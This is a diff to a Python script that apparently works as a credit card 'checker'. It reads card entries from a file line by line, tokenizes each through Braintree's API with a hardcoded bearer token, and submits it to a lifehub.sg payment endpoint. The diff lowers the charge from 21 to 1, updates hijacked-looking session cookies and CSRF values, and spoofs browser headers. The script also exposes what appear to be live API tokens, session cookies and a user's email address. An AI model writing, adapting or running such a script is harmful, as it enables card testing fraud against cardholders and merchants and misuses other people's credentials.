@@ -133,11 +133,12 @@ for P in file.readlines():
     #time.sleep(10)
 
     
+    
     headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ4NjM4MjQsImp0aSI6Ijc3OTQ2MDcyLWQ3YjktNDhkMi1hNDZkLTdhYzNmNDhiNTlkMCIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.9UQTCgbpZjwIMxCnXDxjmDSZWkluDPr8Zjo0r7WA6-ykndLeNh9jENkB2qdV6UWDOMbOrTf29QFSzAPzTv9qAw',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUwODQ5OTQsImp0aSI6IjNlODdhZGRjLWQ2MDItNDg1NS04NmM2LWYwOWVmZDE4NzFiOSIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.XhEVFnDJtVjmKFnfElPE5BnzRvcfVzu3yIioSlw1m7aEEPfElGi6mgEUYwMj9v1uBBuA-0-XiRro3EYQJLvI7Q',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
@@ -150,11 +151,12 @@ for P in file.readlines():
         'sec-fetch-site': 'cross-site',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
+    
     json_data = {
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': '89c55b0a-13a4-4734-a209-30fdca9eb130',
+            'sessionId': '307fefce-6b42-460d-b645-a19da55f02c4',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
@@ -175,7 +177,6 @@ for P in file.readlines():
     
     response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
     
-    
     try:
         tok = (response.json()['data']['tokenizeCreditCard']['token'])
     except TypeError:
@@ -183,6 +184,8 @@ for P in file.readlines():
         sys.exit()
 
 
+    
+    
     cookies = {
         'visid_incap_2624039': '/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh',
         'osVisitor': '1875de0b-9cfb-4cfe-bd66-744771ee42be',
@@ -193,32 +196,32 @@ for P in file.readlines():
         '1': 'qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=',
         '2': 'Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==',
         'nr2ApolloUser_CS': 'crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com',
-        'nlbi_2624039': 'KQujBI8AVU9adyd4nrr3FQAAAAALdRiA4CwPW1i3nygsAjwj',
-        'incap_ses_2222_2624039': '1gBVGv2P5DvppTI1hyHWHlVcZGcAAAAAdySI2Bklett0qJr4jD7Ykw==',
-        'osVisit': '22bdbcfc-dfee-40be-b1e1-b27f08cd7f91',
-        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870227590%3bexp%3d63872819290%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dNFV37vWxEyJ4LMLlf4PSiFdhbM8%3d',
-        '_ga_WSCFS5WWZ0': 'GS1.1.1734630491.27.0.1734630491.0.0.0',
-        'ASP.NET_SessionId': '412s5wgixcslrk1cyhvbdctr',
+        'nlbi_2624039': '3dbROLzzdVvotLKUnrr3FQAAAADkPaMg1jcS3yBnxXHHsJRT',
+        'incap_ses_467_2624039': 'JAuxX1lzEBMepKZ9Ph57Bjb6aWcAAAAAwsvSEp96SHrNeYSfL8vTLw==',
+        'osVisit': '63544d6f-cc06-4bf4-85b3-d1f2fd237e74',
+        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870595689%3bexp%3d63873187389%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3datsEH83sCORf3prJVQ%2bgLM3h9HQ%3d',
+        '_ga_WSCFS5WWZ0': 'GS1.1.1734998590.31.0.1734998590.0.0.0',
+        'ASP.NET_SessionId': 'knjgyh5kmvxwusfkxniphm31',
     }
-    
+
     headers = {
         'authority': 'www.lifehub.sg',
         'accept': 'application/json',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
         'content-type': 'application/json; charset=UTF-8',
-        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=KQujBI8AVU9adyd4nrr3FQAAAAALdRiA4CwPW1i3nygsAjwj; incap_ses_2222_2624039=1gBVGv2P5DvppTI1hyHWHlVcZGcAAAAAdySI2Bklett0qJr4jD7Ykw==; osVisit=22bdbcfc-dfee-40be-b1e1-b27f08cd7f91; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870227590%3bexp%3d63872819290%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dNFV37vWxEyJ4LMLlf4PSiFdhbM8%3d; _ga_WSCFS5WWZ0=GS1.1.1734630491.27.0.1734630491.0.0.0; ASP.NET_SessionId=412s5wgixcslrk1cyhvbdctr',
+        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=3dbROLzzdVvotLKUnrr3FQAAAADkPaMg1jcS3yBnxXHHsJRT; incap_ses_467_2624039=JAuxX1lzEBMepKZ9Ph57Bjb6aWcAAAAAwsvSEp96SHrNeYSfL8vTLw==; osVisit=63544d6f-cc06-4bf4-85b3-d1f2fd237e74; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870595689%3bexp%3d63873187389%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3datsEH83sCORf3prJVQ%2bgLM3h9HQ%3d; _ga_WSCFS5WWZ0=GS1.1.1734998590.31.0.1734998590.0.0.0; ASP.NET_SessionId=knjgyh5kmvxwusfkxniphm31',
         'origin': 'https://www.lifehub.sg',
         'referer': 'https://www.lifehub.sg/product-payment',
         'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'x-csrftoken': 'kHUF/2SaeYof2VV0aUMllJQo6V4=',
     }
-    
+
     json_data = {
         'versionInfo': {
             'moduleVersion': '2kO0xfHUmy5B4kIlM5D_vw',
@@ -231,7 +234,7 @@ for P in file.readlines():
                     'ProductId': '1',
                     'Name': '',
                     'ProductPrice': '0',
-                    'TotalPrice': '21',
+                    'TotalPrice': '1',
                     'DiscountPrice': '0',
                     'Order': 0,
                     'Description': '',
@@ -241,6 +244,13 @@ for P in file.readlines():
             'TokenNonce': tok,
         },
     }
+    
+    response = requests.post(
+        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
+        cookies=cookies,
+        headers=headers,
+        json=json_data,
+    )
     
     response = requests.post(
         'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
